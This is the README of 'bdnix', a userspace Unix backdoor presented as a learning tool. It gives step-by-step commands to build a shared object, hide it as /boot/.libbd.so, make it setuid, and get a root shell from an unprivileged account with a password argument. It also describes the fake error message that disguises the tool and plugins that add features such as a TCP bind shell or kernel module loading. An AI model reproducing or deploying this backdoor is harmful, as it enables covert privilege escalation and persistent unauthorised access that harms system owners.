 <pre>
      ___           ___           ___                       ___     
     /\  \         /\  \         /\__\          ___        |\__\    
    /::\  \       /::\  \       /::|  |        /\  \       |:|  |   
   /:/\:\  \     /:/\:\  \     /:|:|  |        \:\  \      |:|  |   
  /::\~\:\__\   /:/  \:\__\   /:/|:|  |__      /::\__\     |:|__|__ 
 /:/\:\ \:|__| /:/__/ \:|__| /:/ |:| /\__\  __/:/\/__/ ____/::::\__\
 \:\~\:\/:/  / \:\  \ /:/  / \/__|:|/:/  / /\/:/  /    \::::/~~/~   
  \:\ \::/  /   \:\  /:/  /      |:/:/  /  \::/__/      ~~|:|~~|    
   \:\/:/  /     \:\/:/  /       |::/  /    \:\__\        |:|  |    
    \::/__/       \::/__/        /:/  /      \/__/        |:|  |    
     ~~            ~~            \/__/                     \|__|    
 </pre>

<p>Trivial userspace backdoor for Unix</p>
</p>Emanuele Paiano - nixw0rm@gmail.com</p>

<h6>This is a learning tool, so use it ONLY on your home systems (like 
Desktop PC or Raspberry Pi). I'm not responsable for abuses. 
Use it at your risk!  </h6>                         

------------------
 GETTING STARTED
------------------

1) Open root terminal in current directory and move to bdnix folder
  <pre>
   # cd /path/bdnix
   </pre>
2) From root run 'make' to build binary file
  <pre>
   # make
   </pre>
3) copy created file (i.e. libbd.so) with -p option to a hidden location like /bin, /etc,
<pre>
   # cp -p libbd.so /boot/.libbd.so
   # chmod +sx /boot/.libbd.so
   </pre>       
   and setuid file (chmod +x).


4) logout from server and log in again with unprivileged user. 


5) Run binary with joshua argument to enable backdoor
<pre>
   $ /boot/.libbd.so joshua /bin/sh
   #

   You can see '#': you are root! :)
   </pre>

6) Running without joshua password, you can read a (fake) error:
<pre>
/bin/sh: cannot execute binary file
</pre>

---------------------
 CUSTOMIZE PASSWORD
---------------------

Open settings.h and change default password "joshua"
<pre><code>
#define ARG1 "joshua"
</code></pre>
to "chips"
<pre><code>
#define ARG1 "chips"
</code></pre>
Now recompile backdoor with "make" and test it with new password:
<pre><code>
$ /boot/.libbd.so chips /bin/sh
#
</code></pre>
it works! :)


-----------------
 ENABLE PLUGINS
-----------------
Plugins are .h file in plugins/ folder. Plugins permit to add code portions and
extend bdnix feature (i.e. bind shell on TCP port, load kernel module, etc).
To enable a plugin:

1) Open settings.h include file and search for options like:
<pre><code>
/* PLUGINS */

/* enable rootshell */
#define SHELL 1
</code></pre>       
2) Set 1 to enable, or 0 to disable code.

Example: If you have rootshell disabled and myplugin enabled:
<pre><code>
/* enable rootshell */
#define SHELL 0

/* my plugin */
#define MYPLUGIN 1
</code></pre>    
Your backdoor run MYPLUGIN code and ignore rootshell. You can enable more plugins together: 
they will run in sequential mode. 

For adding or writing custom plugin, read next paragraph.


-----------------------
 WRITE A CUSTOM PLUGIN
-----------------------
1) If you want write your plugin, you should create .h file into plugin using next template:
<pre><code>
int PLUGIN_NAME_init()
{
  //code plugin
}
</code></pre>
and replace PLUGIN_NAME with your plugin's name and write your code between {} in function.  

2) Open bdcode.c and find this code portion into main():
<pre><code>
 #if SHELL == 1
   shell_init(argv[2]);
 #endif
</code></pre>
   and add some lines code:
<pre><code>
 #if SHELL == 1
   shell_init(argv[2]);
 #endif
 #if PLUGIN_NAME == 1
   PLUGIN_NAME_init();
 #endif
</code></pre>
 don't forget to remove PLUGIN_NAME with your plugin's name.

3) Before main(), add these lines:
<pre><code>
#if PLUGIN_NAME == 1
#include "plugin/PLUGIN_NAME.h"
#endif
</code></pre>

and remove PLUGIN_NAME with your plugin's name.

TIPS: you can edit RAW plugin.



----------
 LICENSE
----------
This code is released under GNU/GPL3 terms.
